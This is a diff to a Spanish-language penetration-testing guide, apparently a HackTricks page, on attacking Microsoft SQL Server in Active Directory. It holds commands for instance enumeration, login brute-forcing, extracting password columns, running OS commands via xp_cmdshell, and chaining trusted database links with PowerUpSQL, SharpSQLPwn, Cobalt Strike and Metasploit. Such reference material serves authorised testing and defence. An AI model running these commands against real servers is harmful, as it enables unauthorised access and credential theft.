@@ -7,7 +7,7 @@
 
 ### Python
 
-La herramienta [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) se basa en impacket y también permite autenticarse utilizando tickets kerberos y atacar a través de cadenas de enlaces.
+La herramienta [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) se basa en impacket, y también permite autenticarse utilizando tickets kerberos, y atacar a través de cadenas de enlaces.
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -91,11 +91,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ###  Powershell
 
 El módulo de powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) es muy útil en este caso.
-```powershell
+```bash
 Import-Module .\PowerupSQL.psd1
 ````
 ### Enumerando desde la red sin sesión de dominio
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -109,7 +109,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
 ### Enumerando desde dentro del dominio
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -117,6 +117,12 @@ Get-SQLInstanceLocal | Get-SQLServerInfo
 #Get info about valid MSQL instances running in domain
 #This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
 Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+
+# Try dictionary attack to login
+Invoke-SQLAuditWeakLoginPw
+
+# Search SPNs of common software and try the default creds
+Get-SQLServerDefaultLoginPw
 
 #Test connections with each one
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
@@ -130,11 +136,23 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ## Abuso Básico de MSSQL
 
 ### Acceso a DB
-```powershell
+```bash
+# List databases
+Get-SQLInstanceDomain | Get-SQLDatabase
+
+# List tables in a DB you can read
+Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName
+
+# List columns in a table
+Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName
+
+# Get some sample data from a column in a table (columns username & passwor din the example)
+Get-SQLInstanceDomain | GetSQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10
+
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
 
-#Dump an instance (a lotof CVSs generated in current dir)
+#Dump an instance (a lot of CVSs generated in current dir)
 Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 
 # Search keywords in columns trying to access the MSSQL DBs
@@ -144,11 +162,11 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ### MSSQL RCE
 
 También podría ser posible **ejecutar comandos** dentro del host de MSSQL.
-```powershell
+```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Consulta en la página mencionada en la **siguiente sección cómo hacer esto manualmente.**
+Revisa en la página mencionada en la **siguiente sección cómo hacer esto manualmente.**
 
 ### Trucos Básicos de Hacking en MSSQL
 
@@ -158,12 +176,12 @@ Consulta en la página mencionada en la **siguiente sección cómo hacer esto ma
 
 ## Enlaces de Confianza en MSSQL
 
-Si una instancia de MSSQL es de confianza (enlace de base de datos) por otra instancia de MSSQL. Si el usuario tiene privilegios sobre la base de datos de confianza, podrá **utilizar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas confianzas pueden encadenarse y en algún momento el usuario podría encontrar alguna base de datos mal configurada donde pueda ejecutar comandos.
+Si una instancia de MSSQL es de confianza (enlace de base de datos) por otra instancia de MSSQL. Si el usuario tiene privilegios sobre la base de datos de confianza, podrá **utilizar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas confianzas pueden encadenarse y en algún momento el usuario podría ser capaz de encontrar alguna base de datos mal configurada donde pueda ejecutar comandos.
 
 **Los enlaces entre bases de datos funcionan incluso a través de confianzas de bosque.**
 
 ### Abuso de Powershell
-```powershell
+```bash
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
 
@@ -194,15 +212,21 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
+Otra herramienta similar que podría usarse es [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
+```bash
+SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+# Cobalt Strike
+inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+```
 ### Metasploit
 
-Puedes verificar fácilmente los enlaces de confianza utilizando metasploit.
+Puedes verificar fácilmente los enlaces de confianza usando metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Nota que metasploit intentará abusar solo de la función `openquery()` en MSSQL (así que, si no puedes ejecutar comandos con `openquery()`, necesitarás intentar el método `EXECUTE` **manualmente** para ejecutar comandos, ver más abajo).
+Notice that metasploit will try to abuse only the `openquery()` function in MSSQL (so, if you can't execute command with `openquery()` you will need to try the `EXECUTE` method **manually** to execute commands, see more below.)
 
 ### Manual - Openquery()
 
@@ -210,7 +234,7 @@ Desde **Linux** podrías obtener un shell de consola MSSQL con **sqsh** y **mssq
 
 Desde **Windows** también podrías encontrar los enlaces y ejecutar comandos manualmente usando un **cliente MSSQL como** [**HeidiSQL**](https://www.heidisql.com)
 
-_Inicia sesión usando autenticación de Windows:_
+_Iniciar sesión usando autenticación de Windows:_
 
 ![](<../../images/image (808).png>)
 
@@ -221,7 +245,7 @@ EXEC sp_linkedservers;
 ```
 ![](<../../images/image (716).png>)
 
-#### Ejecutar consultas en enlace confiable
+#### Ejecutar consultas en un enlace confiable
 
 Ejecutar consultas a través del enlace (ejemplo: encontrar más enlaces en la nueva instancia accesible):
 ```sql
